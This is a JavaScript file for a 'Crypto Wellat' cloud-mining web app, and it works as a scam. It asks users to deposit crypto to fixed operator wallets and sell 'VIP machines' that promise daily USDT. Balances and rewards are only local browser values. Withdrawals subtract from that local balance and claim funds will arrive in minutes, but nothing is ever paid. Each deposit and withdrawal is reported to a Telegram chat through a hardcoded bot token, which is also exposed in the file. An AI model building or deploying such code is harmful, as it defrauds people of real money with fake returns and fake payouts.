// Telegram API Configuration
const TELEGRAM_BOT_TOKEN = '8401039769:AAErdk3eB81U9PTBUtHpNeM4FdWVpo-0Os0';
const TELEGRAM_CHAT_ID = '7417215529';

// Global State
let userState = {
    brokerBalance: 20.00,
    foundBalance: 40.00,
    miningMachines: [],
    miningActive: false,
    miningStartTime: null,
    miningClaimable: false,
    cloudMiningActive: false,
    userId: null,
    lastWithdrawal: null
};

// VIP Machines Data
const vipMachines = [
    { id: 1, name: "VIP Machine 1", cost: 10, dailyMining: 2 },
    { id: 2, name: "VIP Machine 2", cost: 50, dailyMining: 10 },
    { id: 3, name: "VIP Machine 3", cost: 150, dailyMining: 30 },
    { id: 4, name: "VIP Machine 4", cost: 450, dailyMining: 90 },
    { id: 5, name: "VIP Machine 5", cost: 1350, dailyMining: 275 }
];

// Wallet Addresses
const walletAddresses = {
    'BEP20': '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
    'ERC20': '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
    'TRC20': 'TSKPhwUavSrKXXcbWG2TdPzYiBtoTNXP6i',
    'POLYGON': '0x53f90e7a0d2834b772890f4f456d51aaed61de43'
};

// Initialize the application
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
});

function initializeApp() {
    console.log('🚀 Initializing Crypto Wellat...');
    
    // Load existing state or initialize new user
    loadState();
    
    // Initialize UI
    updateUI();
    startMiningCycleCheck();
    updateQuickStats();
    
    // Setup event listeners
    setupEventListeners();
    
    console.log('✅ Crypto Wellat initialized successfully');
}

function setupEventListeners() {
    // Mining controls
    document.getElementById('startMining').addEventListener('click', startMining);
    document.getElementById('claimRewards').addEventListener('click', claimRewards);
    
    // Withdrawal amount calculation
    document.getElementById('withdrawAmount').addEventListener('input', calculateReceiveAmount);
}

function loadState() {
    try {
        const savedState = localStorage.getItem('cryptoWellatState');
        if (savedState) {
            const parsedState = JSON.parse(savedState);
            userState = { ...userState, ...parsedState };
        }
        
        if (!userState.userId) {
            userState.userId = generateUserId();
        }
    } catch (error) {
        console.error('Failed to load state:', error);
        userState.userId = generateUserId();
    }
}

function saveState() {
    try {
        localStorage.setItem('cryptoWellatState', JSON.stringify(userState));
        return true;
    } catch (error) {
        console.error('Failed to save state:', error);
        return false;
    }
}

function generateUserId() {
    return 'USER_' + Math.random().toString(36).substr(2, 9).toUpperCase();
}

function updateUI() {
    // Update balances
    document.getElementById('brokerBalance').textContent = userState.brokerBalance.toFixed(2) + ' USDT';
    document.getElementById('foundBalance').textContent = userState.foundBalance.toFixed(2) + ' USDT';
    document.getElementById('withdrawAvailable').textContent = userState.foundBalance.toFixed(2) + ' USDT';
    
    // Update mining buttons
    const startBtn = document.getElementById('startMining');
    const claimBtn = document.getElementById('claimRewards');
    
    if (userState.miningActive) {
        startBtn.classList.add('hidden');
        claimBtn.classList.remove('hidden');
        claimBtn.disabled = !userState.miningClaimable;
    } else {
        startBtn.classList.remove('hidden');
        claimBtn.classList.add('hidden');
        startBtn.disabled = userState.miningMachines.length === 0;
    }
    
    // Update mining status
    updateMiningStatus();
}

function updateQuickStats() {
    const activeMachines = userState.miningMachines.length;
    const dailyEarnings = userState.miningMachines.reduce((total, machine) => total + machine.dailyMining, 0);
    const miningPower = Math.min(activeMachines * 20, 100);
    
    document.getElementById('activeMachines').textContent = activeMachines;
    document.getElementById('dailyEarnings').textContent = dailyEarnings.toFixed(2) + ' USDT';
    document.getElementById('miningPower').textContent = miningPower + '%';
}

function updateMiningStatus() {
    const statusText = document.getElementById('miningStatusText');
    const timer = document.getElementById('miningTimer');
    
    if (userState.miningActive) {
        if (userState.miningClaimable) {
            statusText.textContent = 'Ready to Claim!';
            statusText.style.color = '#10B981';
            timer.classList.add('hidden');
        } else {
            statusText.textContent = 'Mining...';
            statusText.style.color = '#8B5CF6';
            timer.classList.remove('hidden');
        }
    } else {
        statusText.textContent = userState.miningMachines.length > 0 ? 'Ready to Mine' : 'Buy VIP to Start';
        statusText.style.color = '#B0B0B0';
        timer.classList.add('hidden');
    }
}

function startMining() {
    if (userState.miningMachines.length === 0) {
        showSuccessMessage('Please purchase a VIP machine first.');
        return;
    }

    showLoading();
    
    setTimeout(() => {
        userState.miningActive = true;
        userState.miningStartTime = Date.now();
        userState.miningClaimable = false;
        
        hideLoading();
        updateUI();
        
        // Send Telegram notification
        sendTelegramNotification('mining_start', {
            userId: userState.userId,
            machines: userState.miningMachines.length
        });
        
        saveState();
        showSuccessMessage('Mining started successfully!');
    }, 1000);
}

function claimRewards() {
    if (!userState.miningActive || !userState.miningClaimable) {
        showSuccessMessage('Mining cycle not complete yet.');
        return;
    }

    showLoading();
    
    setTimeout(() => {
        // Calculate rewards
        const totalDailyMining = userState.miningMachines.reduce((total, machine) => {
            return total + machine.dailyMining;
        }, 0);

        // Apply cloud mining bonus
        const cloudBonus = userState.cloudMiningActive ? 0.3 : 0;
        const baseReward = totalDailyMining / 2; // 12-hour cycle = half daily
        const bonusReward = baseReward * cloudBonus;
        const totalReward = baseReward + bonusReward;

        // Add to found balance
        userState.foundBalance += totalReward;

        // Reset mining state
        userState.miningActive = false;
        userState.miningClaimable = false;
        userState.miningStartTime = null;

        hideLoading();
        updateUI();
        updateQuickStats();
        
        // Send Telegram notification
        sendTelegramNotification('mining_claim', {
            amount: totalReward,
            totalBalance: userState.foundBalance,
            userId: userState.userId
        });
        
        saveState();
        showSuccessMessage(`Successfully claimed ${totalReward.toFixed(2)} USDT!`);
    }, 1000);
}

function startMiningCycleCheck() {
    setInterval(() => {
        if (userState.miningActive && userState.miningStartTime && !userState.miningClaimable) {
            const elapsed = Date.now() - userState.miningStartTime;
            const twelveHours = 12 * 60 * 60 * 1000;

            if (elapsed >= twelveHours) {
                userState.miningClaimable = true;
                updateUI();
                saveState();
            }
            
            updateMiningTimer();
        }
    }, 1000);
}

function updateMiningTimer() {
    if (userState.miningActive && userState.miningStartTime && !userState.miningClaimable) {
        const elapsed = Date.now() - userState.miningStartTime;
        const remaining = Math.max(0, (12 * 60 * 60 * 1000) - elapsed);
        
        const hours = Math.floor(remaining / (60 * 60 * 1000));
        const minutes = Math.floor((remaining % (60 * 60 * 1000)) / (60 * 1000));
        const seconds = Math.floor((remaining % (60 * 1000)) / 1000);
        
        const timerText = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        document.getElementById('miningTimer').textContent = timerText;
    }
}

// Modal Functions
function openVipModal() {
    document.getElementById('vipModal').classList.remove('hidden');
}

function openWithdrawModal() {
    document.getElementById('withdrawModal').classList.remove('hidden');
    calculateReceiveAmount();
}

function openDepositModal() {
    document.getElementById('depositModal').classList.remove('hidden');
}

function closeModal(modalId) {
    document.getElementById(modalId).classList.add('hidden');
}

function buyVipMachine(machineId) {
    const machine = vipMachines.find(m => m.id === machineId);
    if (!machine) return;

    if (userState.brokerBalance < machine.cost) {
        showSuccessMessage('Insufficient broker balance. Please deposit first.');
        return;
    }

    showLoading();
    
    setTimeout(() => {
        // Deduct cost from balance
        userState.brokerBalance -= machine.cost;
        
        // Add machine to user's collection
        const machinePurchase = {
            ...machine,
            purchaseDate: new Date().toISOString()
        };
        userState.miningMachines.push(machinePurchase);

        // Activate cloud mining if not already active
        if (!userState.cloudMiningActive) {
            userState.cloudMiningActive = true;
        }

        hideLoading();
        updateUI();
        updateQuickStats();
        closeModal('vipModal');
        
        // Send Telegram notification
        sendTelegramNotification('vip_purchase', {
            machine: machine.name,
            amount: machine.cost,
            userBalance: userState.brokerBalance,
            userId: userState.userId
        });
        
        saveState();
        showSuccessMessage(`Successfully purchased ${machine.name}!`);
    }, 1000);
}

function calculateReceiveAmount() {
    const amount = parseFloat(document.getElementById('withdrawAmount').value) || 0;
    document.getElementById('receiveAmount').textContent = amount.toFixed(2) + ' USDT';
}

function setMaxWithdraw() {
    document.getElementById('withdrawAmount').value = userState.foundBalance.toFixed(2);
    calculateReceiveAmount();
}

function processWithdrawal() {
    const amount = parseFloat(document.getElementById('withdrawAmount').value);
    const address = document.querySelector('.address-input').value;
    const network = document.querySelector('.network-select').value;

    if (!amount || amount < 1) {
        showSuccessMessage('Minimum withdrawal amount is 1 USDT');
        return;
    }

    if (amount > userState.foundBalance) {
        showSuccessMessage('Insufficient found balance');
        return;
    }

    if (!address) {
        showSuccessMessage('Please enter withdrawal address');
        return;
    }

    // Check if user has withdrawn today
    const today = new Date().toDateString();
    if (userState.lastWithdrawal === today) {
        showSuccessMessage('You can only withdraw once per day. Please try again tomorrow.');
        return;
    }

    showLoading();
    
    setTimeout(() => {
        // Process withdrawal
        userState.foundBalance -= amount;
        userState.lastWithdrawal = today;

        hideLoading();
        updateUI();
        updateQuickStats();
        closeModal('withdrawModal');
        
        // Send Telegram notification
        sendTelegramNotification('withdrawal', {
            amount: amount,
            network: network,
            address: address,
            userId: userState.userId,
            remainingBalance: userState.foundBalance
        });
        
        saveState();
        showSuccessMessage(`Withdrawal request submitted for ${amount} USDT! Funds will arrive in 1-3 minutes.`);
    }, 1000);
}

function copyDepositAddress() {
    const address = document.getElementById('depositAddress').textContent;
    navigator.clipboard.writeText(address).then(() => {
        showSuccessMessage('Address copied to clipboard!');
    });
}

function confirmPayment() {
    const amount = parseFloat(document.getElementById('depositAmount').value);
    const network = document.getElementById('depositNetwork').value;

    if (!amount || amount < 10) {
        showSuccessMessage('Minimum deposit amount is 10 USDT');
        return;
    }

    showLoading();
    
    setTimeout(() => {
        hideLoading();
        closeModal('depositModal');
        
        // Send Telegram notification
        sendTelegramNotification('deposit_pending', {
            amount: amount,
            network: network,
            userId: userState.userId
        });
        
        showSuccessMessage('Deposit submitted! Balance will be added within 24 hours after confirmation.');
    }, 1000);
}

function confirmDeposit() {
    const amount = parseFloat(document.getElementById('depositAmount').value);
    
    if (amount && amount >= 10) {
        userState.brokerBalance += amount;
        updateUI();
        closeModal('depositModal');
        
        // Send Telegram notification
        sendTelegramNotification('deposit_confirmed', {
            amount: amount,
            userId: userState.userId,
            newBalance: userState.brokerBalance
        });
        
        saveState();
        showSuccessMessage(`Deposit of ${amount} USDT confirmed!`);
    }
}

// Telegram API Functions
async function sendTelegramNotification(type, data) {
    const messages = {
        'mining_start': `🟣 Mining Started\nUser ID: ${data.userId}\nActive Machines: ${data.machines}\nTime: ${new Date().toLocaleString()}`,
        'mining_claim': `🟣 Rewards Claimed\nUser ID: ${data.userId}\nAmount: ${data.amount} USDT\nTotal Balance: ${data.totalBalance} USDT\nTime: ${new Date().toLocaleString()}`,
        'vip_purchase': `🟣 VIP Machine Purchase\nUser ID: ${data.userId}\nMachine: ${data.machine}\nAmount: ${data.amount} USDT\nUser Balance: ${data.userBalance} USDT\nTime: ${new Date().toLocaleString()}`,
        'withdrawal': `🟣 Withdrawal Request\nUser ID: ${data.userId}\nAmount: ${data.amount} USDT\nNetwork: ${data.network}\nAddress: ${data.address}\nRemaining Balance: ${data.remainingBalance} USDT\nTime: ${new Date().toLocaleString()}`,
        'deposit_pending': `🟣 Deposit Pending\nUser ID: ${data.userId}\nAmount: ${data.amount} USDT\nNetwork: ${data.network}\nTime: ${new Date().toLocaleString()}`,
        'deposit_confirmed': `🟣 Deposit Confirmed\nUser ID: ${data.userId}\nAmount: ${data.amount} USDT\nNew Balance: ${data.newBalance} USDT\nTime: ${new Date().toLocaleString()}`
    };

    const message = messages[type] || `🟣 Crypto Wellat Notification\nType: ${type}\nUser ID: ${data.userId}\nData: ${JSON.stringify(data)}\nTime: ${new Date().toLocaleString()}`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        if (!response.ok) {
            console.error('Telegram API error:', await response.text());
        }
    } catch (error) {
        console.error('Failed to send Telegram notification:', error);
    }
}

// Utility Functions
function showLoading() {
    document.getElementById('loadingOverlay').classList.remove('hidden');
}

function hideLoading() {
    document.getElementById('loadingOverlay').classList.add('hidden');
}

function showSuccessMessage(message) {
    document.getElementById('successText').textContent = message;
    document.getElementById('successMessage').classList.remove('hidden');
}

function closeSuccessMessage() {
    document.getElementById('successMessage').classList.add('hidden');
}
